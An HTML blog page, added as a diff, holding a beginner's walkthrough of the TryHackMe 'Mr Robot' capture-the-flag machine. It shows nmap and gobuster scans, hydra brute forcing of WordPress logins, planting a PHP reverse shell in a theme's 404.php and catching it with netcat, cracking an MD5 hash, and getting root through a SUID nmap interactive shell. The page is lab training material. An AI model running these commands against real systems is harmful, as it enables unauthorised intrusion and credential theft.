@@ -1,0 +1,325 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="TryHackMe - Mr Robot CTF" /><meta name="author" content="Nasrallah" /><meta property="og:locale" content="en" /><meta name="description" content="Walkthrough of Mr Robot CTF from TryHackMe" /><meta property="og:description" content="Walkthrough of Mr Robot CTF from TryHackMe" /><link rel="canonical" href="https://nasrallahbaadi.github.io/posts/MrRobotCtf/" /><meta property="og:url" content="https://nasrallahbaadi.github.io/posts/MrRobotCtf/" /><meta property="og:site_name" content="Nasrallah" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-21T01:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="TryHackMe - Mr Robot CTF" /><meta name="twitter:site" content="@NasrallahBaadi" /><meta name="twitter:creator" content="@Nasrallah" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Nasrallah"},"dateModified":"2022-07-08T17:56:10+01:00","datePublished":"2021-12-21T01:00:00+01:00","description":"Walkthrough of Mr Robot CTF from TryHackMe","headline":"TryHackMe - Mr Robot CTF","mainEntityOfPage":{"@type":"WebPage","@id":"https://nasrallahbaadi.github.io/posts/MrRobotCtf/"},"url":"https://nasrallahbaadi.github.io/posts/MrRobotCtf/"}</script><title>TryHackMe - Mr Robot CTF | Nasrallah</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Nasrallah"><meta name="application-name" content="Nasrallah"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Nasrallah</a></div><div class="site-subtitle font-italic">Learning journey</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/NasrallahBaadi" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/NasrallahBaadi" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/NasrallahBaadi" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://app.hackthebox.com/profile/565048" aria-label="HackTheBox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://tryhackme.com/p/Nasrallah" aria-label="TryHackMe" target="_blank" rel="noopener"> <i class="fas fa-cloud"></i> </a> <a href="https://t.me/Sirius1337" aria-label="Telegram" target="_blank" rel="noopener"> <i class="fab fa-telegram"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['baadinasrallah','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>TryHackMe - Mr Robot CTF</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>TryHackMe - Mr Robot CTF</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1640044800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Dec 21, 2021 </em> </span> <span> Updated <em class="" data-ts="1657299370" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 8, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> NasrallahBaadi </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1770 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><div align="center"> <script src="https://tryhackme.com/badge/367641"></script></div><hr /><p>Hello l33ts, I hope you are doing weel. This is my first Writeup, and we will be doing <a href="https://tryhackme.com/room/mrrobot">Mr robot CTF</a> from tryhackme, it is a medium machine based on the Mr. RObot show. let’s dive into it.</p><h1 id="description"><strong>Description</strong></h1><p>Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?</p><h1 id="enumeration"><strong>Enumeration</strong></h1><h2 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>First, let’s start our nmap scan using this command: <code class="language-plaintext highlighter-rouge">sudo nmap -sV -sC {target_IP} -oN nmap.scan</code></p><p>-sV - find the version of all the service running on the target</p><p>-sC - run all the default scripts</p><p>-oN - save the output in a file called nmap</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> 10.10.117.187
+<span class="go">Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-21 05:24 EST
+Nmap scan report for 10.10.117.187
+Host is up (0.10s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache
+443/tcp open   ssl/http Apache httpd
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+|_http-server-header: Apache
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.23 seconds
+</span></pre></table></code></div></div><p>There are three ports open: 22(SSH), 80(http), 443(https), let’s navigate to port 80 and see what’s there, but before that, let’s run a Gobuster directory scan on the target using this command: <code class="language-plaintext highlighter-rouge">gobuster dir -w /usr/share/wordlists/dirb/common.txt -u {target_IP}</code></p><h2 id="gobuster"><span class="mr-2">Gobuster</span><a href="#gobuster" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>When we visit the website, we see some cool stuff going on. Unfortunately, there is nothing useful for us there, let’s take a look at what Gobuster found for us:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt  <span class="nt">-u</span> http://10.10.117.187
+<span class="go">===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.117.187
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/12/21 05:56:02 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 213]
+/.htaccess            (Status: 403) [Size: 218]
+/.htpasswd            (Status: 403) [Size: 218]
+</span><span class="gp">/0                    (Status: 301) [Size: 0] [--&gt;</span><span class="w"> </span>http://10.10.117.187/0/]
+<span class="gp">/admin                (Status: 301) [Size: 235] [--&gt;</span><span class="w"> </span>http://10.10.117.187/admin/]
+<span class="gp">/atom                 (Status: 301) [Size: 0] [--&gt;</span><span class="w"> </span>http://10.10.117.187/feed/atom/]
+<span class="gp">/audio                (Status: 301) [Size: 235] [--&gt;</span><span class="w"> </span>http://10.10.117.187/audio/]  
+<span class="gp">/blog                 (Status: 301) [Size: 234] [--&gt;</span><span class="w"> </span>http://10.10.117.187/blog/]   
+<span class="gp">/css                  (Status: 301) [Size: 233] [--&gt;</span><span class="w"> </span>http://10.10.117.187/css/]    
+<span class="gp">/dashboard            (Status: 302) [Size: 0] [--&gt;</span><span class="w"> </span>http://10.10.117.187/wp-admin/]
+<span class="go">/favicon.ico          (Status: 200) [Size: 0]                                      
+</span><span class="gp">/feed                 (Status: 301) [Size: 0] [--&gt;</span><span class="w"> </span>http://10.10.117.187/feed/]     
+<span class="gp">/image                (Status: 301) [Size: 0] [--&gt;</span><span class="w"> </span>http://10.10.117.187/image/]    
+<span class="gp">/Image                (Status: 301) [Size: 0] [--&gt;</span><span class="w"> </span>http://10.10.117.187/Image/]    
+<span class="gp">/images               (Status: 301) [Size: 236] [--&gt;</span><span class="w"> </span>http://10.10.117.187/images/]
+<span class="go">/index.html           (Status: 200) [Size: 1188]                                   
+</span><span class="gp">/index.php            (Status: 301) [Size: 0] [--&gt;</span><span class="w"> </span>http://10.10.117.187/]          
+<span class="go">/intro                (Status: 200) [Size: 516314]                                 
+</span><span class="gp">/js                   (Status: 301) [Size: 232] [--&gt;</span><span class="w"> </span>http://10.10.117.187/js/]     
+<span class="go">/license              (Status: 200) [Size: 309]                                    
+</span><span class="gp">/login                (Status: 302) [Size: 0] [--&gt;</span><span class="w"> </span>http://10.10.117.187/wp-login.php]
+<span class="gp">/page1                (Status: 301) [Size: 0] [--&gt;</span><span class="w"> </span>http://10.10.117.187/]            
+<span class="go">/phpmyadmin           (Status: 403) [Size: 94]                                       
+</span><span class="gp">/rdf                  (Status: 301) [Size: 0] [--&gt;</span><span class="w"> </span>http://10.10.117.187/feed/rdf/]   
+<span class="go">/readme               (Status: 200) [Size: 64]                                       
+/robots               (Status: 200) [Size: 41]                                       
+/robots.txt           (Status: 200) [Size: 41]                                       
+</span><span class="gp">/rss                  (Status: 301) [Size: 0] [--&gt;</span><span class="w"> </span>http://10.10.117.187/feed/]       
+<span class="gp">/rss2                 (Status: 301) [Size: 0] [--&gt;</span><span class="w"> </span>http://10.10.117.187/feed/]       
+<span class="go">/sitemap              (Status: 200) [Size: 0]                                        
+/sitemap.xml          (Status: 200) [Size: 0]                                        
+</span><span class="gp">/video                (Status: 301) [Size: 235] [--&gt;</span><span class="w"> </span>http://10.10.117.187/video/]    
+<span class="gp">/wp-admin             (Status: 301) [Size: 238] [--&gt;</span><span class="w"> </span>http://10.10.117.187/wp-admin/]
+<span class="gp">/wp-content           (Status: 301) [Size: 240] [--&gt;</span><span class="w"> </span>http://10.10.117.187/wp-content/]
+<span class="go">/wp-config            (Status: 200) [Size: 0]                                         
+/wp-cron              (Status: 200) [Size: 0]                                         
+</span><span class="gp">/wp-includes          (Status: 301) [Size: 241] [--&gt;</span><span class="w"> </span>http://10.10.117.187/wp-includes/]
+<span class="go">/wp-load              (Status: 200) [Size: 0]                                          
+/wp-links-opml        (Status: 200) [Size: 227]                                        
+/wp-login             (Status: 200) [Size: 2613]                                       
+/wp-mail              (Status: 500) [Size: 3064]                                       
+/wp-settings          (Status: 500) [Size: 0]                                          
+</span><span class="gp">/wp-signup            (Status: 302) [Size: 0] [--&gt;</span><span class="w"> </span>http://10.10.117.187/wp-login.php?action<span class="o">=</span>register]
+<span class="go">/xmlrpc               (Status: 405) [Size: 42]                                                       
+/xmlrpc.php           (Status: 405) [Size: 42]         
+
+</span></pre></table></code></div></div><p>We can see that Gobuster has found robots.txt along with other files and directories. The robots.txt file is a document that tells search engines which pages they are and aren’t allowed to show on their search engine results or ban specific search engines from crawling the website altogether. Let’s take a look at robots.txt .</p><p><img data-src="/assets/img/tryhackme/mrrobotctf/robots.png" alt="robots" data-proofer-ignore></p><p>Great! we found our first key, as well as fsocity.dic, the file contain a bunch of words in seperate lines, it seems that it is a wordlist, it contains more than 850k words, let’s remove repeated words using this commad: <code class="language-plaintext highlighter-rouge">sort fsocity.dic | uniq &gt; sorted.dic </code>. Let’s continue our enumeration, gobuster also found wp-login, let’s visit that page.</p><p><img data-src="/assets/img/tryhackme/mrrobotctf/login.png" alt="login" data-proofer-ignore></p><p>As expected, it is a login page for wordpress, trying some default credentials only gets us ERROR: Invalid username, maybe if we submit a correct username we get something different. Using hydra, we can brute force the username with the wordlist we found earlier, but first lets look at the source code of the page.</p><p><img data-src="/assets/img/tryhackme/mrrobotctf/params.png" alt="sourcecode" data-proofer-ignore></p><p>We can see that the method used to submit data is a POST request, with the username parameter “log” and password parameter “pwd”, with these information, we can now start hydra with the following command:<code class="language-plaintext highlighter-rouge">hydra -L sorted.dic -p test {target_IP} http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username"</code></p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="gp"> $</span><span class="w"> </span>hydra <span class="nt">-L</span> sorted.dic <span class="nt">-p</span> <span class="nb">test </span>10.10.117.187 http-post-form <span class="s2">"/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username"</span>
+<span class="go">Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-21 09:01:17
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task
+[DATA] attacking http-post-form://10.10.117.187:80/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username
+[STATUS] 1233.00 tries/min, 1233 tries in 00:01h, 10219 to do in 00:09h, 16 active
+[STATUS] 1235.67 tries/min, 3707 tries in 00:03h, 7745 to do in 00:07h, 16 active
+[80][http-post-form] host: 10.10.117.187   login: elliot   password: test
+[80][http-post-form] host: 10.10.117.187   login: ELLIOT   password: test
+[80][http-post-form] host: 10.10.117.187   login: Elliot   password: test
+</span></pre></table></code></div></div><p>We found our username, let’s now brute force the password using the same command but with some changes: <code class="language-plaintext highlighter-rouge">$ hydra -l elliot -P sorted.dic 10.10.117.187 http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^:The password you entered for the username"</code></p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="gp"> $</span><span class="w"> </span>hydra <span class="nt">-l</span> elliot <span class="nt">-P</span> sorted.dic 10.10.117.187 http-post-form <span class="s2">"/wp-login.php:log=^USER^&amp;pwd=^PASS^:The password you entered for the username"</span>         130 ⨯
+<span class="go">Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-21 10:10:54
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
+[DATA] attacking http-post-form://10.10.117.187:80/wp-login.php:log=^USER^&amp;pwd=^PASS^:The password you entered for the username
+[STATUS] 1174.00 tries/min, 1174 tries in 00:01h, 10278 to do in 00:09h, 16 active
+[STATUS] 1169.67 tries/min, 3509 tries in 00:03h, 7943 to do in 00:07h, 16 active
+[80][http-post-form] host: 10.10.117.187   login: elliot   password: 'redacted'
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-21 10:15:55
+</span></pre></table></code></div></div><p>Great, we got the password, now let’s login using the credentials we found.</p><p><img data-src="/assets/img/tryhackme/mrrobotctf/elliot.png" alt="elliot.png" data-proofer-ignore></p><h1 id="foothold"><strong>Foothold</strong></h1><p>Now that we got access to wordpress account, i googled ‘wordpress reverse shell’ and found this useful <a href="https://www.hackingarticles.in/wordpress-reverse-shell/">article</a>, it explains how we can get a reverse shell by injecting a malicious php code as a wordpress theme, for that i used pentestmonkey php reverse shell that you can find <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">here</a>, you have to change the ip in the code to your machine’s ip, and then set up a listener on your machine using the following command: <code class="language-plaintext highlighter-rouge">nc -nlvp 1234</code>.</p><p>When you finish the setup, visit the page we have edited: <code class="language-plaintext highlighter-rouge">http://{target_IP}/wp-content/themes/twentyfifteen/404.php</code></p><p>And just like that, we got a reverse shell! In order to have a functional shell though we can issue the following:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 1234
+<span class="go">listening on [any] 1234 ...
+connect to [10.11.31.131] from (UNKNOWN) [10.10.117.187] 51538
+</span><span class="gp">Linux linux 3.13.0-55-generic #</span>94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+<span class="go">15:21:18 up  5:21,  0 users,  load average: 0.00, 0.01, 0.12
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
+<span class="go">
+</span><span class="gp">$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="gp">daemon@linux:/$</span><span class="w"> </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="go">export TERM=xterm
+</span><span class="gp">daemon@linux:/$</span><span class="w"> </span>^Z <span class="c">#pressed ctrl+z</span>
+<span class="go">zsh: suspended  nc -lnvp 1234
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg                                                                                                                          </span>148 ⨯ 1 ⚙
+<span class="go">[1]  + continued  nc -lnvp 1234
+
+</span><span class="gp">daemon@linux:/$</span><span class="w">
+</span></pre></table></code></div></div><h1 id="privelege-escalation"><strong>Privelege Escalation</strong></h1><h2 id="robot"><span class="mr-2">robot</span><a href="#robot" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Navigating to /home/robot we find out 2nd key, but we can read it, there is also a file called password.raw-md5 and we can read it, i cracked it using <a href="https://crackstation.net/">crackstation</a> and got robot’s password. Now let’s change the user using the command <code class="language-plaintext highlighter-rouge">su robot</code> and supplying the password we cracked.</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="gp">daemon@linux:/home/robot$</span><span class="w"> </span>su robot
+<span class="go">Password:
+</span><span class="gp">robot@linux:~$</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">robot
+</span></pre></table></code></div></div><p>Now we can read our 2nd key.</p><h2 id="root"><span class="mr-2">root</span><a href="#root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s now upgrade to root and get the 3rd key. Before running any privilege escalation or enumeration script, let’s check the basic commands for elevating privileges like sudo and id :</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="gp">robot@linux:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">[sudo] password for robot:
+Sorry, user robot may not run sudo on linux.
+</span><span class="gp">robot@linux:~$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1002(robot) gid=1002(robot) groups=1002(robot)
+</span><span class="gp">robot@linux:~$</span><span class="w">
+</span></pre></table></code></div></div><p>We got nothing, let’s now look for some SUID binaries using:<code class="language-plaintext highlighter-rouge">find / -type f -perm -04000 2&gt;/dev/null</code></p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="gp">robot@linux:~$</span><span class="w"> </span>find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-04000</span> 2&gt;/dev/null
+<span class="go">/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+</span><span class="gp">robot@linux:~$</span><span class="w">
+</span><span class="go">
+</span></pre></table></code></div></div><p>We can use <a href="https://gtfobins.github.io/">GTFOBins</a> to check for possible vectors, and we see that nmap does not have SUID bit by default. Let’s use it to get root on the machine:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="gp">robot@linux:~$</span><span class="w"> </span>nmap <span class="nt">--interactive</span>
+<span class="go">
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+</span><span class="gp">Welcome to Interactive Mode -- press h &lt;enter&gt;</span><span class="w"> </span><span class="k">for </span><span class="nb">help</span>
+<span class="gp">nmap&gt;</span><span class="w"> </span><span class="o">!</span>sh
+<span class="gp">#</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">root
+</span><span class="gp">#</span><span class="w"> </span><span class="nb">cd</span> /root
+<span class="gp">#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">firstboot_done  key-3-of-3.txt
